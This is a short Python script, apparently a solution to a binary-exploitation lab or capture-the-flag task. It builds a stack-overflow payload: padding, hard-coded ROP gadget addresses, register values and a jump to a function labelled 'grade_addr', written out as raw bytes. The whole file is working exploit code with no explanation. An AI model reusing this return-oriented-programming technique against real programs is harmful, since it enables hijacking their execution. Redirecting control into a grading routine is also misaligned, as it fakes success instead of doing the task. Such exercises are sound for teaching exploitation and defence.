import sys, struct

gadget_a = 0x40189a
gadget_b = 0x401880
grade_addr = 0x401677
r12_val = 0x7fffffffdd98

buf = bytearray(b"A" * 0x104)
buf[8:16] = struct.pack('<Q', gadget_a)
buf[0x10:0x18] = struct.pack('<Q', 0)
buf[0x18:0x20] = struct.pack('<Q', 1)
buf[0x20:0x28] = struct.pack('<Q', r12_val)
buf[0x28:0x30] = struct.pack('<Q', 4)
buf[0x30:0x38] = struct.pack('<Q', 0)
buf[0x38:0x40] = struct.pack('<Q', 0)
buf[0x40:0x48] = struct.pack('<Q', gadget_b)
buf[0x48:0x50] = struct.pack('<Q', grade_addr)
buf[0x100:0x104] = struct.pack('<I', 0xa0)

sys.stdout.buffer.write(buf)
